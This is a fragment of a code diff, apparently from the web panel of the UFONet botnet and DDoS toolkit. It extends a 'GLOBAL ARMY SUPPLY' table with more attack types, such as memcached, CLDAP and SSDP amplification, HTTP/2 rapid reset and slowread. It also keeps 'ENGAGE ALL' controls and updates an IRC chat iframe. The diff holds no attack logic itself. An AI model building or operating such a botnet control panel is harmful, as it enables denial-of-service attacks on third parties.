                     wargames_autopanel = "<u>MASSIVE ACTION</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><button title='Remove ALL: -CLOSED-' onclick=JobRemoveAll('"+str(wargames_deckey)+"')>-PURGE-</button></td><td align='center'><button style='background-color:cyan;height:50px;width:120px' title='Engage ALL: -ONGOING-' onclick=JobAddAll()>ENGAGE ALL!</button></td><td align='center'><button style='background-color:red;height:50px;width:120px' title='Cancel ALL: JOINED!' onclick=JobCancelAll()>PANIC!!!</button></td></tr></table><br><br>"
-                    wargames_supply = "<u>GLOBAL ARMY SUPPLY (rounds)</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'>BOTNET ("+str(self.total_botnet)+"):</td><td align='center'>LOIC:</td><td align='center'>LORIS:</td><td align='center'>UFOSYN:</td><td align='center'>SPRAY:</td><td align='center'>FRAGGLE:</td><td align='center'>SNIPER:</td><td align='center'>UFOACK:</td><td align='center'>UFORST:</td></tr><tr><td align='center'><input type='number' min='1' max='99999' required id='supply_botnet' value='"+str(self.supply_botnet)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loic' value='"+str(self.supply_loic)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loris' value='"+str(self.supply_loris)+"'  style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufosyn' value='"+str(self.supply_ufosyn)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_spray' value='"+str(self.supply_spray)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_fraggle' value='"+str(self.supply_fraggle)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_sniper' value='"+str(self.supply_sniper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoack' value='"+str(self.supply_ufoack)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_uforst' value='"+str(self.supply_uforst)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>SMURF:</td><td align='center'>XMAS:</td><td align='center'>NUKE:</td><td align='center'>TACHYON:</td><td align='center'>MONLIST:</td><td align='center'>DROPER:</td><td align='center'>OVERLAP:</td><td align='center'>PINGER:</td><td align='center'>UFOUDP:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_smurf' value='"+str(self.supply_smurf)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_xmas' value='"+str(self.supply_xmas)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_nuke' value='"+str(self.supply_nuke)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_tachyon' value='"+str(self.supply_tachyon)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_monlist' value='"+str(self.supply_monlist)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_droper' value='"+str(self.supply_droper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_overlap' value='"+str(self.supply_overlap)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_pinger' value='"+str(self.supply_pinger)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoudp' value='"+str(self.supply_ufoudp)+"' style='text-align: center;' readonly></td><td align='center'><button id='supply_edit' title='Edit global army supply...' value='EDIT' onclick=EditSupply()>EDIT</button></td></tr></table><br><br>" 
+                    wargames_supply = "<u>GLOBAL ARMY SUPPLY (rounds)</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'>BOTNET ("+str(self.total_botnet)+"):</td><td align='center'>LOIC:</td><td align='center'>LORIS:</td><td align='center'>UFOSYN:</td><td align='center'>SPRAY:</td><td align='center'>FRAGGLE:</td><td align='center'>SNIPER:</td><td align='center'>UFOACK:</td><td align='center'>UFORST:</td></tr><tr><td align='center'><input type='number' min='1' max='99999' required id='supply_botnet' value='"+str(self.supply_botnet)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loic' value='"+str(self.supply_loic)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_loris' value='"+str(self.supply_loris)+"'  style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufosyn' value='"+str(self.supply_ufosyn)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_spray' value='"+str(self.supply_spray)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_fraggle' value='"+str(self.supply_fraggle)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_sniper' value='"+str(self.supply_sniper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoack' value='"+str(self.supply_ufoack)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_uforst' value='"+str(self.supply_uforst)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>SMURF:</td><td align='center'>XMAS:</td><td align='center'>NUKE:</td><td align='center'>TACHYON:</td><td align='center'>MONLIST:</td><td align='center'>DROPER:</td><td align='center'>OVERLAP:</td><td align='center'>PINGER:</td><td align='center'>UFOUDP:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_smurf' value='"+str(self.supply_smurf)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_xmas' value='"+str(self.supply_xmas)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_nuke' value='"+str(self.supply_nuke)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_tachyon' value='"+str(self.supply_tachyon)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_monlist' value='"+str(self.supply_monlist)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_droper' value='"+str(self.supply_droper)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_overlap' value='"+str(self.supply_overlap)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_pinger' value='"+str(self.supply_pinger)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ufoudp' value='"+str(self.supply_ufoudp)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>MEMCACHED:</td><td align='center'>CHARGEN:</td><td align='center'>CLDAP:</td><td align='center'>SSDP:</td><td align='center'>QOTD:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_memcached' value='"+str(self.supply_memcached)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_chargen' value='"+str(self.supply_chargen)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_cldap' value='"+str(self.supply_cldap)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ssdp' value='"+str(self.supply_ssdp)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_qotd' value='"+str(self.supply_qotd)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>TFTP:</td><td align='center'>WSDISCO:</td><td align='center'>COAP:</td><td align='center'>MSSQL:</td><td align='center'>ARMS:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_tftp' value='"+str(self.supply_tftp)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_wsdisco' value='"+str(self.supply_wsdisco)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_coap' value='"+str(self.supply_coap)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_mssql' value='"+str(self.supply_mssql)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_arms' value='"+str(self.supply_arms)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>PLEX:</td><td align='center'>NETBIOS:</td><td align='center'>RIPV1:</td><td align='center'>MIDDLEBOX:</td><td align='center'>RAPIDRESET:</td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_plex' value='"+str(self.supply_plex)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_netbios' value='"+str(self.supply_netbios)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_ripv1' value='"+str(self.supply_ripv1)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_middlebox' value='"+str(self.supply_middlebox)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_rapidreset' value='"+str(self.supply_rapidreset)+"' style='text-align: center;' readonly></td></tr><tr><td align='center'>SLOWREAD:</td><td align='center'>GOLDENEYE:</td><td align='center'>FINFLOOD:</td><td></td><td></td></tr><tr><td align='center'><input type='number' min='0' max='99999' required id='supply_slowread' value='"+str(self.supply_slowread)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_goldeneye' value='"+str(self.supply_goldeneye)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='99999' required id='supply_finflood' value='"+str(self.supply_finflood)+"' style='text-align: center;' readonly></td><td align='center'><button id='supply_edit' title='Edit global army supply...' value='EDIT' onclick=EditSupply()>EDIT</button></td><td></td></tr></table><br><br>" 
                 else:
                     wargames_autopanel = ""
                     wargames_supply = ""
@@ -7904,7 +8483,7 @@ function runCommandX(cmd,params) {
         if page == "/stats":
             self.pages["/stats"] = self.html_stats()
         if page == "/wormhole":
-            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://webchat.freenode.net'>"
+            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://web.libera.chat/?channel=%23UFONet'>"
         ctype = "text/html"
         if page.find(".js") != -1:
             ctype = "application/javascript"
